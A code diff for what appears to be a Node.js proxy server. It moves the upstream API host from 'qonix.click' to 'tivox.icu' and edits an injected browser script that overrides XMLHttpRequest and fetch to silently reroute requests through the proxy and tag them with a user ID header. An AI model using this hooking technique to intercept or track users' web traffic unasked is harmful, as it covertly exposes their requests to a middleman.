@@ -822,7 +822,7 @@ app.all('/xxapi/*', async (req, res) => {
     const urlLower = path.toLowerCase();
     const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-    const { response, respBody, respHeaders } = await proxyToReal(req);
+    const { response, respBody, respHeaders } = await proxyToTivox(req);
 
     if (data.blockUpdate !== false) {
       for (const k of Object.keys(respHeaders)) {
@@ -1074,14 +1074,14 @@ app.all('/xxapi/*', async (req, res) => {
   } catch(e) {
     console.error('xxapi proxy error:', e.message);
     try {
-      const url = REAL_API + (req.originalUrl || req.url);
+      const url = TIVOX_API + (req.originalUrl || req.url);
       const fwd = {};
       for (const [k, v] of Object.entries(req.headers)) {
         const kl = k.toLowerCase();
         if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
         fwd[k] = v;
       }
-      fwd['host'] = 'qonix.click';
+      fwd['host'] = 'tivox.icu';
       const opts = { method: req.method, headers: fwd, redirect: 'manual' };
       if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
         opts.body = req.rawBody;
@@ -1099,7 +1099,9 @@ app.all('/xxapi/*', async (req, res) => {
 const INJECT_JS = `(function(){
 if(window._pxi)return;window._pxi=1;
 var P='https://${PROXY_HOST}';
-var REAL='https://qonix.click';
+var REAL='https://tivox.icu';
+var REAL2='https://qonix.click';
+function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);return null;}
 var CFG=null;
 var UID='';
 
@@ -1127,9 +1129,7 @@ lcAsync();}
 var _open=XMLHttpRequest.prototype.open;
 var _send=XMLHttpRequest.prototype.send;
 XMLHttpRequest.prototype.open=function(m,u){
-if(typeof u==='string'&&u.indexOf(REAL)===0){
-u=P+u.substring(REAL.length);
-arguments[1]=u;}
+var _pu=_px(u);if(_pu){u=_pu;arguments[1]=u;}
 this._hu=u;this._hm=m;
 var ret=_open.apply(this,arguments);
 if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
@@ -1198,8 +1198,7 @@ var _fetch=window.fetch;
 if(_fetch){
 window.fetch=function(input,init){
 var url=typeof input==='string'?input:(input&&input.url)||'';
-if(url.indexOf(REAL)===0){
-var nu=P+url.substring(REAL.length);
+var _purl=_px(url);if(_purl){var nu=_purl;
 if(typeof input==='string'){arguments[0]=nu;}
 else{arguments[0]=new Request(nu,input);}}
 if(UID){if(!init)init={};if(!init.headers)init.headers={};
